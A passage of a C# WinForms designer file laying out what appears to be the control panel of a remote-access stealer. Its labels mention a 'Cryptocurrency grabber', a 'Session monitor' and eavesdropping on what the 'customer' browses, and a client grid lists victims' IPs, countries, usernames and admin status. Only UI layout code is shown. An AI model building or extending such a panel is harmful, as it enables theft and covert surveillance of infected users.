        this.pictureBox8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.pictureBox8.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox8.Image")));
        this.pictureBox8.Location = new System.Drawing.Point(366, 37);
        this.pictureBox8.Name = "pictureBox8";
        this.pictureBox8.Size = new System.Drawing.Size(84, 51);
        this.pictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox8.TabIndex = 574;
        this.pictureBox8.TabStop = false;
        // 
        // Page2
        // 
        this.Page2.BackColor = System.Drawing.Color.White;
        this.Page2.Controls.Add(this.PanelMonitor);
        this.Page2.Location = new System.Drawing.Point(4, 4);
        this.Page2.Name = "Page2";
        this.Page2.Padding = new System.Windows.Forms.Padding(3);
        this.Page2.Size = new System.Drawing.Size(944, 487);
        this.Page2.TabIndex = 1;
        this.Page2.Text = "PageMonitor";
        // 
        // PanelMonitor
        // 
        this.PanelMonitor.Controls.Add(this.bunifuShadowPanel3);
        this.PanelMonitor.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelMonitor.Location = new System.Drawing.Point(3, 3);
        this.PanelMonitor.Name = "PanelMonitor";
        this.PanelMonitor.Size = new System.Drawing.Size(938, 481);
        this.PanelMonitor.TabIndex = 1;
        this.PanelMonitor.Visible = false;
        // 
        // bunifuShadowPanel3
        // 
        this.bunifuShadowPanel3.BackColor = System.Drawing.Color.White;
        this.bunifuShadowPanel3.BorderColor = System.Drawing.Color.White;
        this.bunifuShadowPanel3.BorderRadius = 20;
        this.bunifuShadowPanel3.BorderThickness = 1;
        this.bunifuShadowPanel3.Controls.Add(this.bunifuSeparator6);
        this.bunifuShadowPanel3.Controls.Add(this.bunifuLabel8);
        this.bunifuShadowPanel3.Controls.Add(this.ClaerListMonitor);
        this.bunifuShadowPanel3.Controls.Add(this.InfoMonitorCounts);
        this.bunifuShadowPanel3.Controls.Add(this.LogsMonitor);
        this.bunifuShadowPanel3.Dock = System.Windows.Forms.DockStyle.Fill;
        this.bunifuShadowPanel3.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.bunifuShadowPanel3.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.bunifuShadowPanel3.Location = new System.Drawing.Point(0, 0);
        this.bunifuShadowPanel3.Name = "bunifuShadowPanel3";
        this.bunifuShadowPanel3.PanelColor = System.Drawing.Color.White;
        this.bunifuShadowPanel3.PanelColor2 = System.Drawing.Color.White;
        this.bunifuShadowPanel3.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.bunifuShadowPanel3.ShadowDept = 2;
        this.bunifuShadowPanel3.ShadowDepth = 9;
        this.bunifuShadowPanel3.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.bunifuShadowPanel3.ShadowTopLeftVisible = false;
        this.bunifuShadowPanel3.Size = new System.Drawing.Size(938, 481);
        this.bunifuShadowPanel3.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.bunifuShadowPanel3.TabIndex = 46;
        // 
        // bunifuSeparator6
        // 
        this.bunifuSeparator6.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator6.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator6.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator6.BackgroundImage")));
        this.bunifuSeparator6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator6.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator6.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator6.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator6.LineThickness = 1;
        this.bunifuSeparator6.Location = new System.Drawing.Point(8, 431);
        this.bunifuSeparator6.Name = "bunifuSeparator6";
        this.bunifuSeparator6.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator6.Size = new System.Drawing.Size(918, 11);
        this.bunifuSeparator6.TabIndex = 589;
        // 
        // bunifuLabel8
        // 
        this.bunifuLabel8.AllowParentOverrides = false;
        this.bunifuLabel8.AutoEllipsis = false;
        this.bunifuLabel8.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel8.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel8.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuLabel8.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel8.Location = new System.Drawing.Point(23, 26);
        this.bunifuLabel8.Name = "bunifuLabel8";
        this.bunifuLabel8.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel8.Size = new System.Drawing.Size(589, 15);
        this.bunifuLabel8.TabIndex = 578;
        this.bunifuLabel8.Text = "This list does nothing but show you a notification if the customer browses anythi" +
"ng that is under eavesdropping";
        this.bunifuLabel8.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel8.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ClaerListMonitor
        // 
        this.ClaerListMonitor.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.ClaerListMonitor.AutoSize = true;
        this.ClaerListMonitor.Font = new System.Drawing.Font("Consolas", 9F);
        this.ClaerListMonitor.Location = new System.Drawing.Point(833, 448);
        this.ClaerListMonitor.Name = "ClaerListMonitor";
        this.ClaerListMonitor.Size = new System.Drawing.Size(77, 14);
        this.ClaerListMonitor.TabIndex = 575;
        this.ClaerListMonitor.TabStop = true;
        this.ClaerListMonitor.Text = "List Clear";
        this.ClaerListMonitor.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.ClaerListMonitor_LinkClicked);
        // 
        // InfoMonitorCounts
        // 
        this.InfoMonitorCounts.AllowParentOverrides = false;
        this.InfoMonitorCounts.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.InfoMonitorCounts.AutoEllipsis = false;
        this.InfoMonitorCounts.AutoSize = false;
        this.InfoMonitorCounts.Cursor = System.Windows.Forms.Cursors.Default;
        this.InfoMonitorCounts.CursorType = System.Windows.Forms.Cursors.Default;
        this.InfoMonitorCounts.Font = new System.Drawing.Font("Consolas", 9F);
        this.InfoMonitorCounts.ForeColor = System.Drawing.Color.Black;
        this.InfoMonitorCounts.Location = new System.Drawing.Point(23, 443);
        this.InfoMonitorCounts.Name = "InfoMonitorCounts";
        this.InfoMonitorCounts.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.InfoMonitorCounts.Size = new System.Drawing.Size(505, 19);
        this.InfoMonitorCounts.TabIndex = 567;
        this.InfoMonitorCounts.Text = "0 Cryptocurrency grabber | 0 Session monitor";
        this.InfoMonitorCounts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
        this.InfoMonitorCounts.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // LogsMonitor
        // 
        this.LogsMonitor.AllowUserToAddRows = false;
        this.LogsMonitor.AllowUserToDeleteRows = false;
        this.LogsMonitor.AllowUserToResizeColumns = false;
        this.LogsMonitor.AllowUserToResizeRows = false;
        dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.LogsMonitor.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle9;
        this.LogsMonitor.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.LogsMonitor.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.LogsMonitor.BackgroundColor = System.Drawing.Color.White;
        this.LogsMonitor.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.LogsMonitor.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.LogsMonitor.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.LogsMonitor.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle10.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(234)))), ((int)(((byte)(235)))), ((int)(((byte)(238)))));
        dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.DimGray;
        dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.LogsMonitor.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle10;
        this.LogsMonitor.ColumnHeadersHeight = 30;
        this.LogsMonitor.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.LogsMonitor.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewImageColumn2,
            this.dataGridViewTextBoxColumn2,
            this.Column3,
            this.Column2,
            this.dataGridViewTextBoxColumn4});
        dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle11.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle11.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.LogsMonitor.DefaultCellStyle = dataGridViewCellStyle11;
        this.LogsMonitor.EnableHeadersVisualStyles = false;
        this.LogsMonitor.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.LogsMonitor.Location = new System.Drawing.Point(9, 60);
        this.LogsMonitor.Name = "LogsMonitor";
        this.LogsMonitor.ReadOnly = true;
        this.LogsMonitor.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.LogsMonitor.RowHeadersVisible = false;
        this.LogsMonitor.RowHeadersWidth = 40;
        this.LogsMonitor.RowTemplate.Height = 30;
        this.LogsMonitor.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.LogsMonitor.Size = new System.Drawing.Size(920, 372);
        this.LogsMonitor.TabIndex = 487;
        this.LogsMonitor.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.LogsMonitor.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.LogsMonitor.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.LogsMonitor.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.LogsMonitor.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.LogsMonitor.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.LogsMonitor.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.LogsMonitor.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.LogsMonitor.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        this.LogsMonitor.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.LogsMonitor.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.LogsMonitor.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.LogsMonitor.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.LogsMonitor.ThemeStyle.HeaderStyle.Height = 30;
        this.LogsMonitor.ThemeStyle.ReadOnly = true;
        this.LogsMonitor.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.LogsMonitor.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.LogsMonitor.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.LogsMonitor.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.LogsMonitor.ThemeStyle.RowsStyle.Height = 30;
        this.LogsMonitor.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        this.LogsMonitor.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.Black;
        // 
        // dataGridViewImageColumn2
        // 
        this.dataGridViewImageColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
        this.dataGridViewImageColumn2.FillWeight = 30F;
        this.dataGridViewImageColumn2.HeaderText = "Type";
        this.dataGridViewImageColumn2.Name = "dataGridViewImageColumn2";
        this.dataGridViewImageColumn2.ReadOnly = true;
        this.dataGridViewImageColumn2.Width = 50;
        // 
        // dataGridViewTextBoxColumn2
        // 
        this.dataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn2.HeaderText = "Time";
        this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
        this.dataGridViewTextBoxColumn2.ReadOnly = true;
        this.dataGridViewTextBoxColumn2.Resizable = System.Windows.Forms.DataGridViewTriState.True;
        this.dataGridViewTextBoxColumn2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
        this.dataGridViewTextBoxColumn2.Width = 42;
        // 
        // Column3
        // 
        this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column3.HeaderText = "IP";
        this.Column3.Name = "Column3";
        this.Column3.ReadOnly = true;
        this.Column3.Width = 44;
        // 
        // Column2
        // 
        this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column2.HeaderText = "Title";
        this.Column2.Name = "Column2";
        this.Column2.ReadOnly = true;
        this.Column2.Width = 57;
        // 
        // dataGridViewTextBoxColumn4
        // 
        this.dataGridViewTextBoxColumn4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn4.HeaderText = "Message";
        this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
        this.dataGridViewTextBoxColumn4.ReadOnly = true;
        this.dataGridViewTextBoxColumn4.Resizable = System.Windows.Forms.DataGridViewTriState.True;
        this.dataGridViewTextBoxColumn4.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
        // 
        // Page3
        // 
        this.Page3.BackColor = System.Drawing.Color.White;
        this.Page3.Controls.Add(this.PanelClients);
        this.Page3.Location = new System.Drawing.Point(4, 4);
        this.Page3.Name = "Page3";
        this.Page3.Size = new System.Drawing.Size(944, 487);
        this.Page3.TabIndex = 2;
        this.Page3.Text = "PageClients";
        // 
        // PanelClients
        // 
        this.PanelClients.Controls.Add(this.PanelListClient);
        this.PanelClients.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelClients.Location = new System.Drawing.Point(0, 0);
        this.PanelClients.Name = "PanelClients";
        this.PanelClients.Size = new System.Drawing.Size(944, 487);
        this.PanelClients.TabIndex = 1;
        this.PanelClients.Visible = false;
        // 
        // PanelListClient
        // 
        this.PanelListClient.BackColor = System.Drawing.Color.White;
        this.PanelListClient.BorderColor = System.Drawing.Color.White;
        this.PanelListClient.BorderRadius = 20;
        this.PanelListClient.BorderThickness = 1;
        this.PanelListClient.Controls.Add(this.bunifuSeparator2);
        this.PanelListClient.Controls.Add(this.InfoListClients);
        this.PanelListClient.Controls.Add(this.SearchListClient);
        this.PanelListClient.Controls.Add(this.ClientsList);
        this.PanelListClient.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelListClient.FillStyle = Bunifu.UI.WinForms.BunifuShadowPanel.FillStyles.Solid;
        this.PanelListClient.GradientMode = Bunifu.UI.WinForms.BunifuShadowPanel.GradientModes.Vertical;
        this.PanelListClient.Location = new System.Drawing.Point(0, 0);
        this.PanelListClient.Name = "PanelListClient";
        this.PanelListClient.PanelColor = System.Drawing.Color.White;
        this.PanelListClient.PanelColor2 = System.Drawing.Color.White;
        this.PanelListClient.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
        this.PanelListClient.ShadowDept = 2;
        this.PanelListClient.ShadowDepth = 9;
        this.PanelListClient.ShadowStyle = Bunifu.UI.WinForms.BunifuShadowPanel.ShadowStyles.Surrounded;
        this.PanelListClient.ShadowTopLeftVisible = false;
        this.PanelListClient.Size = new System.Drawing.Size(944, 487);
        this.PanelListClient.Style = Bunifu.UI.WinForms.BunifuShadowPanel.BevelStyles.Flat;
        this.PanelListClient.TabIndex = 6;
        // 
        // bunifuSeparator2
        // 
        this.bunifuSeparator2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator2.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator2.BackgroundImage")));
        this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator2.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator2.LineThickness = 1;
        this.bunifuSeparator2.Location = new System.Drawing.Point(8, 437);
        this.bunifuSeparator2.Name = "bunifuSeparator2";
        this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator2.Size = new System.Drawing.Size(927, 11);
        this.bunifuSeparator2.TabIndex = 588;
        // 
        // InfoListClients
        // 
        this.InfoListClients.AllowParentOverrides = false;
        this.InfoListClients.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.InfoListClients.AutoEllipsis = false;
        this.InfoListClients.AutoSize = false;
        this.InfoListClients.AutoSizeHeightOnly = true;
        this.InfoListClients.Cursor = System.Windows.Forms.Cursors.Default;
        this.InfoListClients.CursorType = System.Windows.Forms.Cursors.Default;
        this.InfoListClients.Font = new System.Drawing.Font("Consolas", 9F);
        this.InfoListClients.ForeColor = System.Drawing.Color.Black;
        this.InfoListClients.Location = new System.Drawing.Point(23, 452);
        this.InfoListClients.Name = "InfoListClients";
        this.InfoListClients.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.InfoListClients.Size = new System.Drawing.Size(252, 1);
        this.InfoListClients.TabIndex = 567;
        this.InfoListClients.Text = "0 Selected    |    0 New Client    |    0 Client";
        this.InfoListClients.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.InfoListClients.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // SearchListClient
        // 
        this.SearchListClient.AcceptsReturn = false;
        this.SearchListClient.AcceptsTab = false;
        this.SearchListClient.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.SearchListClient.AnimationSpeed = 200;
        this.SearchListClient.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.SearchListClient.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.SearchListClient.AutoSizeHeight = true;
        this.SearchListClient.BackColor = System.Drawing.Color.Transparent;
        this.SearchListClient.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("SearchListClient.BackgroundImage")));
        this.SearchListClient.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(115)))), ((int)(((byte)(103)))), ((int)(((byte)(240)))));
        this.SearchListClient.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.SearchListClient.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(115)))), ((int)(((byte)(103)))), ((int)(((byte)(240)))));
        this.SearchListClient.BorderColorIdle = System.Drawing.Color.Silver;
        this.SearchListClient.BorderRadius = 10;
        this.SearchListClient.BorderThickness = 1;
        this.SearchListClient.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.SearchListClient.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.SearchListClient.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.SearchListClient.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.SearchListClient.DefaultText = "";
        this.SearchListClient.FillColor = System.Drawing.Color.White;
        this.SearchListClient.HideSelection = true;
        this.SearchListClient.IconLeft = ((System.Drawing.Image)(resources.GetObject("SearchListClient.IconLeft")));
        this.SearchListClient.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.SearchListClient.IconPadding = 2;
        this.SearchListClient.IconRight = null;
        this.SearchListClient.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.SearchListClient.Lines = new string[0];
        this.SearchListClient.Location = new System.Drawing.Point(23, 22);
        this.SearchListClient.MaxLength = 32767;
        this.SearchListClient.MinimumSize = new System.Drawing.Size(1, 1);
        this.SearchListClient.Modified = false;
        this.SearchListClient.Multiline = false;
        this.SearchListClient.Name = "SearchListClient";
        stateProperties61.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(115)))), ((int)(((byte)(103)))), ((int)(((byte)(240)))));
        stateProperties61.FillColor = System.Drawing.Color.Empty;
        stateProperties61.ForeColor = System.Drawing.Color.Empty;
        stateProperties61.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SearchListClient.OnActiveState = stateProperties61;
        stateProperties62.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties62.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties62.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties62.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.SearchListClient.OnDisabledState = stateProperties62;
        stateProperties63.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(115)))), ((int)(((byte)(103)))), ((int)(((byte)(240)))));
        stateProperties63.FillColor = System.Drawing.Color.Empty;
        stateProperties63.ForeColor = System.Drawing.Color.Empty;
        stateProperties63.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SearchListClient.OnHoverState = stateProperties63;
        stateProperties64.BorderColor = System.Drawing.Color.Silver;
        stateProperties64.FillColor = System.Drawing.Color.White;
        stateProperties64.ForeColor = System.Drawing.Color.Empty;
        stateProperties64.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SearchListClient.OnIdleState = stateProperties64;
        this.SearchListClient.Padding = new System.Windows.Forms.Padding(3);
        this.SearchListClient.PasswordChar = '\0';
        this.SearchListClient.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.SearchListClient.PlaceholderText = "Search";
        this.SearchListClient.ReadOnly = false;
        this.SearchListClient.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.SearchListClient.SelectedText = "";
        this.SearchListClient.SelectionLength = 0;
        this.SearchListClient.SelectionStart = 0;
        this.SearchListClient.ShortcutsEnabled = true;
        this.SearchListClient.Size = new System.Drawing.Size(903, 28);
        this.SearchListClient.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.SearchListClient.TabIndex = 507;
        this.SearchListClient.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.SearchListClient.TextMarginBottom = 0;
        this.SearchListClient.TextMarginLeft = 3;
        this.SearchListClient.TextMarginTop = 1;
        this.SearchListClient.TextPlaceholder = "Search";
        this.SearchListClient.UseSystemPasswordChar = false;
        this.SearchListClient.WordWrap = true;
        this.SearchListClient.KeyDown += new System.Windows.Forms.KeyEventHandler(this.SearchListClient_KeyDown);
        // 
        // ClientsList
        // 
        this.ClientsList.AllowUserToAddRows = false;
        this.ClientsList.AllowUserToDeleteRows = false;
        this.ClientsList.AllowUserToResizeColumns = false;
        this.ClientsList.AllowUserToResizeRows = false;
        dataGridViewCellStyle12.BackColor = System.Drawing.Color.White;
        this.ClientsList.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle12;
        this.ClientsList.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.ClientsList.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.ClientsList.BackgroundColor = System.Drawing.Color.White;
        this.ClientsList.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ClientsList.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ClientsList.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ClientsList.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle13.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle13.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
        dataGridViewCellStyle13.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ClientsList.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle13;
        this.ClientsList.ColumnHeadersHeight = 30;
        this.ClientsList.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ClientsList.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.CLogo,
            this.CNickname,
            this.CID,
            this.CIP,
            this.CPort,
            this.CFlag,
            this.CCountry,
            this.CUsername,
            this.CAdmin,
            this.CSystem,
            this.CDate,
            this.Column1,
            this.CVersion,
            this.CPing,
            this.CActive});
        this.ClientsList.ContextMenuStrip = this.ContexClients;
        dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle17.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle17.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle17.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle17.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        dataGridViewCellStyle17.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ClientsList.DefaultCellStyle = dataGridViewCellStyle17;
        this.ClientsList.EnableHeadersVisualStyles = false;
        this.ClientsList.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
        this.ClientsList.Location = new System.Drawing.Point(9, 60);
        this.ClientsList.Name = "ClientsList";
        this.ClientsList.ReadOnly = true;
        this.ClientsList.RowHeadersVisible = false;
        this.ClientsList.RowHeadersWidth = 27;
